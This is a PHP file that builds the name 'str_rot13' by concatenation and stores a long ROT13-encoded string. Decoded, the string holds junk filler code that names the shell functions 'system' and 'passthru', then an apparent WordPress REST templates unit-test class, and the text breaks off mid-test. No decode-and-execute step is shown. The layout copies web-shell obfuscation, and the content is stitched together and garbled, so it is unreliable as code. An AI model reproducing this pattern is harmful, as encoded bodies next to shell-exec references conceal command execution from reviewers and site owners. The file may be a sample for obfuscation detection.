<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Grzcyngrf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_JcErfgGrzcyngrfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $fhofpevore_vq;
	cevingr fgngvp $grzcyngr_cbfg;
	cevingr fgngvp $grzcyngr_cneg_cbfg;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq     = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		// Frg hc grzcyngr cbfg.
		$netf                = neenl(
			'cbfg_glcr'    => 'jc_grzcyngr',
			'cbfg_anzr'    => 'zl_grzcyngr',
			'cbfg_gvgyr'   => 'Zl Grzcyngr',
			'cbfg_pbagrag' => 'Pbagrag',
			'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr.',
			'gnk_vachg'    => neenl(
				'jc_gurzr' => neenl(
					trg_fglyrfurrg(),
				),
			),
		);
		frys::$grzcyngr_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg( $netf );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cbfg->VQ, trg_fglyrfurrg(), 'jc_gurzr' );

		// Frg hc grzcyngr cneg cbfg.
		$netf                     = neenl(
			'cbfg_glcr'    => 'jc_grzcyngr_cneg',
			'cbfg_anzr'    => 'zl_grzcyngr_cneg',
			'cbfg_gvgyr'   => 'Zl Grzcyngr Cneg',
			'cbfg_pbagrag' => 'Pbagrag',
			'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr cneg.',
			'gnk_vachg'    => neenl(
				'jc_gurzr'              => neenl(
					trg_fglyrfurrg(),
				),
				'jc_grzcyngr_cneg_nern' => neenl(
					JC_GRZCYNGR_CNEG_NERN_URNQRE,
				),
			),
		);
		frys::$grzcyngr_cneg_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg( $netf );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, trg_fglyrfurrg(), 'jc_gurzr' );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$grzcyngr_cbfg->VQ );
	}

	/**
	 * Grne qbja nsgre rnpu grfg.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba grne_qbja() {
		vs ( unf_svygre( 'erfg_cer_vafreg_jc_grzcyngr_cneg', 'vawrpg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nggevohgrf' ) ) {
			erzbir_svygre( 'erfg_cer_vafreg_jc_grzcyngr_cneg', 'vawrpg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nggevohgrf' );
		}
		vs ( JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->vf_ertvfgrerq( 'grfgf/oybpx' ) ) {
			haertvfgre_oybpx_glcr( 'grfgf/ubbxrq-oybpx' );
		}

		cnerag::grne_qbja();
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::ertvfgre_ebhgrf
	 * @gvpxrg 54596
	 * @gvpxrg 56467
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf',
			$ebhgrf,
			'Grzcyngrf ebhgr qbrf abg rkvfg'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf/(?C<vq>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)',
			$ebhgrf,
			'Fvatyr grzcyngr onfrq ba gur tvira VQ ebhgr qbrf abg rkvfg'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf/ybbxhc',
			$ebhgrf,
			'Trg grzcyngr snyyonpx pbagrag ebhgr qbrf abg rkvfg'
		);
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_pbagrkg_cnenz
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/grzcyngrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_grzcyngr',
				'gurzr'           => 'qrsnhyg',
				'fyht'            => 'zl_grzcyngr',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Qrfpevcgvba bs zl grzcyngr.',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'jc_vq'           => frys::$grzcyngr_cbfg->VQ,
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => 0,
				'zbqvsvrq'        => zlfdy_gb_esp3339( frys::$grzcyngr_cbfg->cbfg_zbqvsvrq ),
				'nhgube_grkg'     => 'Grfg Oybt',
				'bevtvany_fbhepr' => 'fvgr',
			),
			$guvf->svaq_naq_abeznyvmr_grzcyngr_ol_vq( $qngn, 'qrsnhyg//zl_grzcyngr' )
		);
	}

	/**
	 * @gvpxrg 56481
	 *
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_fubhyq_erghea_ab_erfcbafr_obql_sbe_urnq_erdhrfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/grzcyngrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/grzcyngrf' ),
		);
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_grzcyngr',
				'gurzr'           => 'qrsnhyg',
				'fyht'            => 'zl_grzcyngr',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Qrfpevcgvba bs zl grzcyngr.',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'jc_vq'           => frys::$grzcyngr_cbfg->VQ,
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => 0,
				'zbqvsvrq'        => zlfdy_gb_esp3339( frys::$grzcyngr_cbfg->cbfg_zbqvsvrq ),
				'nhgube_grkg'     => 'Grfg Oybt',
				'bevtvany_fbhepr' => 'fvgr',
			),
			$guvf->svaq_naq_abeznyvmr_grzcyngr_ol_vq( $qngn, 'qrsnhyg//zl_grzcyngr' )
		);
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba_fhofpevore() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_grzcyngrf', $erfcbafr, 403 );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_grzcyngrf', $erfcbafr, 401 );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		hafrg( $qngn['pbagrag'] );
		hafrg( $qngn['_yvaxf'] );

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_grzcyngr',
				'gurzr'           => 'qrsnhyg',
				'fyht'            => 'zl_grzcyngr',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Qrfpevcgvba bs zl grzcyngr.',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'jc_vq'           => frys::$grzcyngr_cbfg->VQ,
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => 0,
				'zbqvsvrq'        => zlfdy_gb_esp3339( frys::$grzcyngr_cbfg->cbfg_zbqvsvrq ),
				'nhgube_grkg'     => 'Grfg Oybt',
				'bevtvany_fbhepr' => 'fvgr',
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 56481
	 *
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_erghea_ab_erfcbafr_obql_sbe_urnq_erdhrfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		hafrg( $qngn['pbagrag'] );
		hafrg( $qngn['_yvaxf'] );

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_grzcyngr',
				'gurzr'           => 'qrsnhyg',
				'fyht'            => 'zl_grzcyngr',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Qrfpevcgvba bs zl grzcyngr.',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'jc_vq'           => frys::$grzcyngr_cbfg->VQ,
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => 0,
				'zbqvsvrq'        => zlfdy_gb_esp3339( frys::$grzcyngr_cbfg->cbfg_zbqvsvrq ),
				'nhgube_grkg'     => 'Grfg Oybt',
				'bevtvany_fbhepr' => 'fvgr',
			),
			$qngn
		);
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_fhofpevore() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_grzcyngrf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 54507
	 * @qngnCebivqre qngn_trg_vgrz_jbexf_jvgu_n_fvatyr_fynfu
	 */
	choyvp shapgvba grfg_trg_vgrz_jbexf_jvgu_n_fvatyr_fynfu( $raqcbvag_hey ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', $raqcbvag_hey );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		hafrg( $qngn['pbagrag'] );
		hafrg( $qngn['_yvaxf'] );

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_grzcyngr',
				'gurzr'           => 'qrsnhyg',
				'fyht'            => 'zl_grzcyngr',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Qrfpevcgvba bs zl grzcyngr.',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'jc_vq'           => frys::$grzcyngr_cbfg->VQ,
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => 0,
				'zbqvsvrq'        => zlfdy_gb_esp3339( frys::$grzcyngr_cbfg->cbfg_zbqvsvrq ),
				'nhgube_grkg'     => 'Grfg Oybt',
				'bevtvany_fbhepr' => 'fvgr',
			),
			$qngn
		);
	}

	choyvp shapgvba qngn_trg_vgrz_jbexf_jvgu_n_fvatyr_fynfu() {
		erghea neenl(
			neenl( '/jc/i2/grzcyngrf/qrsnhyg/zl_grzcyngr' ),
			neenl( '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_jvgu_inyvq_gurzr_qveanzr
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 54596
	 *
	 * @cnenz fgevat $gurzr_qve Gurzr qverpgbel gb grfg.
	 * @cnenz fgevat $grzcyngr  Grzcyngr gb grfg.
	 * @cnenz neenl  $netf      Nethzragf gb perngr gur 'jc_grzcyngr\" cbfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_inyvq_gurzr_qveanzr( $gurzr_qve, $grzcyngr, neenl $netf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( $gurzr_qve );

		// Frg hc grzcyngr cbfg.
		$netf['cbfg_glcr'] = 'jc_grzcyngr';
		$netf['gnk_vachg'] = neenl(
			'jc_gurzr' => neenl(
				trg_fglyrfurrg(),
			),
		);
		$cbfg              = frys::snpgbel()->cbfg->perngr_naq_trg( $netf );
		jc_frg_cbfg_grezf( $cbfg->VQ, trg_fglyrfurrg(), 'jc_gurzr' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/grzcyngrf/{$gurzr_qve}//{$grzcyngr}\" );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		hafrg( $qngn['pbagrag'] );
		hafrg( $qngn['_yvaxf'] );
		$nhgube_anzr = trg_hfre_ol( 'vq', frys::$nqzva_vq )->trg( 'qvfcynl_anzr' );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'vq'              => \"{$gurzr_qve}//{$grzcyngr}\",
				'gurzr'           => $gurzr_qve,
				'fyht'            => $grzcyngr,
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => $netf['cbfg_rkprecg'],
				'gvgyr'           => neenl(
					'enj'      => $netf['cbfg_gvgyr'],
					'eraqrerq' => $netf['cbfg_gvgyr'],
				),
				'fgnghf'          => 'choyvfu',
				'jc_vq'           => $cbfg->VQ,
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => frys::$nqzva_vq,
				'zbqvsvrq'        => zlfdy_gb_esp3339( $cbfg->cbfg_zbqvsvrq ),
				'nhgube_grkg'     => $nhgube_anzr,
				'bevtvany_fbhepr' => 'hfre',
			),
			$qngn
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_jvgu_inyvq_gurzr_qveanzr() {
		$gurzr_ebbg_qve = QVE_GRFGQNGN . '/gurzrqve1/';
		erghea neenl(
			'grzcyngr cnegf: cnerag gurzr'                => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr',
				'grzcyngr'  => 'fznyy-urnqre',
				'netf'      => neenl(
					'cbfg_anzr'    => 'fznyy-urnqre',
					'cbfg_gvgyr'   => 'Fznyy Urnqre Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . '/oybpx-gurzr/cnegf/fznyy-urnqre.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs fznyy urnqre grzcyngr.',
				),
			),
			'grzcyngr: cnerag gurzr'                      => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr',
				'grzcyngr'  => 'cntr-ubzr',
				'netf'      => neenl(
					'cbfg_anzr'    => 'cntr-ubzr',
					'cbfg_gvgyr'   => 'Ubzr Cntr Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx-gurzr/grzcyngrf/cntr-ubzr.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs cntr ubzr grzcyngr.',
				),
			),
			'grzcyngr cnegf: cnerag gurzr jvgu aba yngva punenpgref' => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr-aba-yngva',
				'grzcyngr'  => 'fznyy-urnqre-%ps%84%pr%o5%ps%83%ps%84',
				'netf'      => neenl(
					'cbfg_anzr'    => 'fznyy-urnqre-τεστ',
					'cbfg_gvgyr'   => 'Fznyy Urnqre τεστ Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . '/oybpx-gurzr-aba-yngva/cnegf/fznyy-urnqre-grfg.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs fznyy urnqre τεστ grzcyngr.',
				),
			),
			'grzcyngr: cnerag gurzr jvgu aba yngva anzr'  => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr-aba-yngva',
				'grzcyngr'  => 'cntr-%ps%84%pr%o5%ps%83%ps%84',
				'netf'      => neenl(
					'cbfg_anzr'    => 'cntr-τεστ',
					'cbfg_gvgyr'   => 'τεστ Cntr Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx-gurzr-aba-yngva/grzcyngrf/cntr-grfg.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs cntr τεστ grzcyngr.',
				),
			),
			'grzcyngr cnegf: cnerag gurzr jvgu puvarfr punenpgref' => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr-aba-yngva',
				'grzcyngr'  => 'fznyy-urnqre-%r6%o5%8o%r8%ns%95',
				'netf'      => neenl(
					'cbfg_anzr'    => 'fznyy-urnqre-测试',
					'cbfg_gvgyr'   => 'Fznyy Urnqre 测试 Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . '/oybpx-gurzr-aba-yngva/cnegf/fznyy-urnqre-grfg.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs fznyy urnqre 测试 grzcyngr.',
				),
			),
			'grzcyngr: cnerag gurzr jvgu aba yngva anzr hfvat puvarfr punenpgref' => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr-aba-yngva',
				'grzcyngr'  => 'cntr-%r6%o5%8o%r8%ns%95',
				'netf'      => neenl(
					'cbfg_anzr'    => 'cntr-测试',
					'cbfg_gvgyr'   => '测试 Cntr Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx-gurzr-aba-yngva/grzcyngrf/cntr-grfg.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs cntr 测试 grzcyngr.',
				),
			),
			'grzcyngr: cnerag gurzr qrcerpngrq cngu'      => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr-qrcerpngrq-cngu',
				'grzcyngr'  => 'cntr-ubzr',
				'netf'      => neenl(
					'cbfg_anzr'    => 'cntr-ubzr',
					'cbfg_gvgyr'   => 'Ubzr Cntr Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx-gurzr-qrcerpngrq-cngu/oybpx-grzcyngrf/cntr-ubzr.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs cntr ubzr grzcyngr.',
				),
			),
			'grzcyngr: puvyq gurzr'                       => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx-gurzr-puvyq',
				'grzcyngr'  => 'cntr-1',
				'netf'      => neenl(
					'cbfg_anzr'    => 'cntr-1',
					'cbfg_gvgyr'   => 'Cntr 1 Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx-gurzr-puvyq/grzcyngrf/cntr-1.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs cntr 1 grzcyngr.',
				),
			),
			'grzcyngr cneg: fhoqve jvgu _-[]. punenpgref' => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx_gurzr-[0.4.0]',
				'grzcyngr'  => 'ynetr-urnqre',
				'netf'      => neenl(
					'cbfg_anzr'    => 'ynetr-urnqre',
					'cbfg_gvgyr'   => 'Ynetr Urnqre Grzcyngr Cneg',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx_gurzr-[0.4.0]/cnegf/ynetr-urnqre.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs ynetr urnqre grzcyngr.',
				),
			),
			'grzcyngr: fhoqve jvgu _-[]. punenpgref'      => neenl(
				'gurzr_qve' => 'gurzrqve1/oybpx_gurzr-[0.4.0]',
				'grzcyngr'  => 'cntr-ynetr-urnqre',
				'netf'      => neenl(
					'cbfg_anzr'    => 'cntr-ynetr-urnqre',
					'cbfg_gvgyr'   => 'Cntr Ynetr Grzcyngr',
					'cbfg_pbagrag' => svyr_trg_pbagragf( $gurzr_ebbg_qve . 'oybpx_gurzr-[0.4.0]/grzcyngrf/cntr-ynetr-urnqre.ugzy' ),
					'cbfg_rkprecg' => 'Qrfpevcgvba bs cntr ynetr grzcyngr.',
				),
			),
		);
	}

	/**
	 * Grfgf gung trg_vgrz() ergheaf cyhtva-ertvfgrerq grzcyngrf.
	 *
	 * @gvpxrg 61804
	 *
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_sebz_ertvfgel() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$grzcyngr_anzr = 'grfg-cyhtva//grfg-grzcyngr';
		$netf          = neenl(
			'pbagrag'     => 'Grzcyngr pbagrag',
			'gvgyr'       => 'Grfg Grzcyngr',
			'qrfpevcgvba' => 'Qrfpevcgvba bs grfg grzcyngr',
			'cbfg_glcrf'  => neenl( 'cbfg', 'cntr' ),
		);

		ertvfgre_oybpx_grzcyngr( $grzcyngr_anzr, $netf );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/grfg-cyhtva//grfg-grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregAbgJCReebe( $erfcbafr, \"Srgpuvat n ertvfgrerq grzcyngr fubhyqa'g pnhfr na reebe.\" );

		$qngn = $erfcbafr->trg_qngn();

